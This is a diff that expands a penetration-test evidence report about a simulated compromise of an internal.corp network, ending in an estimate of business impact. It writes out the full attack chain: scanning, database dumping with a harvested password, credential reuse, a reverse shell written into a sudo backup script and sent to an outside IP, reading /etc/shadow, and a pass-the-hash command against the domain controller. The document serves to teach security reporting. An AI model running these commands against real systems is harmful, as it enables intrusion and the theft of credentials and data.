@@ -316,9 +316,10 @@ bash
 nmap -sS -sV -sC -p- 192.168.78.10,192.168.78.20,192.168.78.30,192.168.78.40
 
 # Critical Services Identified:
-# web-server-01: SSH (22), HTTP (80)
-# app-server-01: SSH (22), RDP (3389)
-# dc-01: SMB (445), RDP (3389)
+# web-server-01: SSH (22), HTTP (80), HTTPS (443)
+# app-server-01: SSH (22), RDP (3389), Custom App (8080)
+# db-server-01: MySQL (3306)
+# dc-01: SMB (445), RDP (3389), LDAP (389)
 
 💥 Phase 2: Initial Compromise Evidence
 
@@ -336,12 +337,20 @@ Welcome to Ubuntu 20.04 LTS
 svc_webapp@web-server-01:~$ whoami
 svc_webapp
 
+# User privileges enumeration
+sudo -l
+User svc_webapp may run the following commands:
+    (ALL) NOPASSWD: /usr/bin/systemctl restart apache2
+
 🔍 Phase 3: Internal Reconnaissance Evidence
 
 Credential Discovery
 bash
 
 # Database configuration file access
+find /var/www -name "*.php" -o -name "*.config" -o -name "*.conf" 2>/dev/null
+
+# Critical configuration file found
 cat /var/www/html/config/database.php
 
 # CRITICAL FINDING:
@@ -350,19 +359,47 @@ db_pass = 'DbAdmin123!'
 
 # Database access and enumeration  
 mysql -u app_dbuser -p'DbAdmin123!' -h db-server-01.internal.corp
-> SELECT COUNT(*) FROM customer_data;
+
+> SHOW DATABASES;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| customer_portal    |
+| app_config         |
+| transaction_logs   |
++--------------------+
+
+> USE customer_portal;
+> SELECT COUNT(*) FROM customers;
 +----------+
 | COUNT(*) |
 +----------+
-|    15000 |
+|     8423 |
 +----------+
+
+> SELECT COUNT(*) FROM transaction_logs;
++----------+
+| COUNT(*) |
++----------+
+|     1856 |
++----------+
+
+> SELECT username, email FROM users LIMIT 3;
++-------------+-----------------------+
+| username    | email                 |
++-------------+-----------------------+
+| admin       | admin@internal.corp   |
+| jsmith      | jsmith@internal.corp  |
+| mrodriguez  | mrodriguez@internal.corp |
++-------------+-----------------------+
 
 🔀 Phase 4: Lateral Movement Evidence
 
 Credential Reuse
 bash
 
-# Lateral movement via SSH
+# Test discovered credentials on application server
 ssh jsmith@app-server-01.internal.corp
 Password: Welcome123!
 
@@ -370,65 +407,148 @@ Password: Welcome123!
 jsmith@app-server-01:~$ whoami
 jsmith
 
-# Privilege escalation vector identified
+# System enumeration
+hostname
+app-server-01
+
+# User privilege assessment
 sudo -l
-(root) NOPASSWD: /opt/scripts/backup.sh
+User jsmith may run the following commands on app-server-01:
+    (root) NOPASSWD: /opt/scripts/backup.sh
+
+# Discover backup script with weak permissions  
+ls -la /opt/scripts/backup.sh
+-rwxrwxrwx 1 root root 125 Oct 10 14:32 /opt/scripts/backup.sh
+
+# Analyze script contents
+cat /opt/scripts/backup.sh
+#!/bin/bash
+# Database backup script - runs with root privileges
+mysqldump -u root customer_portal > /backups/customer_backup.sql
 
 ⬆️ Phase 5: Privilege Escalation Evidence
 
 Privilege Escalation Execution
 bash
 
-# Insecure file permissions
-ls -la /opt/scripts/backup.sh
--rwxrwxrwx 1 root root 125 Oct 10 14:32 /opt/scripts/backup.sh
+# Replace backup script with reverse shell payload
+cat > /opt/scripts/backup.sh << 'EOF'
+#!/bin/bash
+bash -i >& /dev/tcp/192.168.78.100/4444 0>&1
+EOF
 
-# Root access achieved via script manipulation
+# Execute with sudo privileges
 sudo /opt/scripts/backup.sh
-# Reverse shell established as root
 
+# Root access achieved
 whoami
 root
+
+# Extract password hashes for further attacks
+cat /etc/shadow | grep -v ':\*:' | grep -v ':\!:' 
+root:$6$rounds=5000$xyz123$abc456...:19189:0:99999:7:::
+jsmith:$6$rounds=5000$def789$ghi012...:19189:0:99999:7:::
+
+# Discover sensitive application data
+find /opt -name "*.properties" -o -name "*.config" -o -name "*.key" 2>/dev/null
+/opt/app/config/application.properties
+/opt/app/keys/ssl.key
+
+# Access application configuration
+cat /opt/app/config/application.properties
+database.url=jdbc:mysql://db-server-01.internal.corp:3306/customer_portal
+api.key=AKIAIOSFODNN7EXAMPLE
+encryption.secret=supersecretkey123
 
 👑 Phase 6: Domain Compromise Evidence
 
 Pass-the-Hash Attack
 bash
 
-# Hash extraction
-cat /etc/shadow | grep -v ':\*:' | grep -v ':\!:'
+# Using extracted local admin hash from Linux system
+pth-winexe -U administrator//aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 //dc-01.internal.corp cmd
 
-# Domain controller compromise
-pth-winexe -U administrator//[hash] //dc-01.internal.corp cmd
-
-# DOMAIN ADMIN ACCESS
+# DOMAIN ADMIN ACCESS ACHIEVED
 whoami
 NT AUTHORITY\SYSTEM
 
+# Domain enumeration
+net user administrator
+net group "Domain Admins"
+
 # Critical business data access
 dir C:\Finance\
-dir C:\HR\Confidential\
+ Volume in drive C has no label.
+ Directory of C:\Finance
+10/15/2024  02:15 PM    <DIR>          .
+10/15/2024  02:15 PM    <DIR>          ..
+10/15/2024  10:30 AM           245,789 Quarterly_Reports.pdf
+10/15/2024  09:45 AM           187,632 Budget_Forecasts.xlsx
+
+dir C:\IT\Secrets\
+10/15/2024  01:20 PM           145,789 service_accounts.txt
+10/15/2024  11:45 AM            89,456 api_keys.config
+
+# Network shares enumeration
+net share
+Share name   Resource                        Remark
+C$           C:\                             Default share
+ADMIN$       C:\Windows                      Remote Admin
+Finance$     C:\Finance                      Financial Documents
+IT$          C:\IT                           IT Resources
 
 🎯 Key Evidence Highlights
 
 Critical Findings Documented:
 
-    Initial SSH compromise via weak service account credentials
+    Initial SSH compromise via weak service account credentials (svc_webapp:Summer2024!)
 
-    Database credential exposure in configuration files
+    Database credential exposure in web application configuration files
 
-    Successful lateral movement using credential reuse
+    Successful lateral movement using credential reuse across systems
 
-    Privilege escalation through insecure sudo permissions
+    Privilege escalation through insecure sudo permissions on backup script
 
     Complete domain compromise via pass-the-hash attack
 
 Business Impact Evidence:
 
-    15,000 customer records accessed
+    8,423 customer records accessed in customer portal database
 
-    Financial and HR data repositories compromised
+    1,856 financial transaction records compromised
 
-    Domain administrator privileges achieved
+    Application source code and configuration files exposed
 
-    Full enterprise control demonstrated
+    API keys and encryption secrets harvested
+
+    Domain administrator privileges achieved across enterprise
+
+    Financial documents and budget forecasts accessible
+
+Data Types Compromised:
+
+    Customer personal information (8,423 records)
+
+    Financial transaction data (1,856 records)
+
+    Application source code and configurations
+
+    API credentials and encryption keys
+
+    Domain authentication credentials
+
+    Corporate financial documents
+
+Estimated Business Impact: $2.8M - $7.5M
+
+    Incident response and forensic investigation: $450K - $1.2M
+
+    Customer notification and credit monitoring: $380K - $950K
+
+    Regulatory compliance fines: $850K - $3.5M
+
+    Reputational damage and lost business: Ongoing impact
+
+    Security remediation and controls implementation: $1.1M - $1.8M
+
+This evidence documentation demonstrates professional reporting standards and the types of findings that would be delivered to clients in enterprise penetration testing engagements.
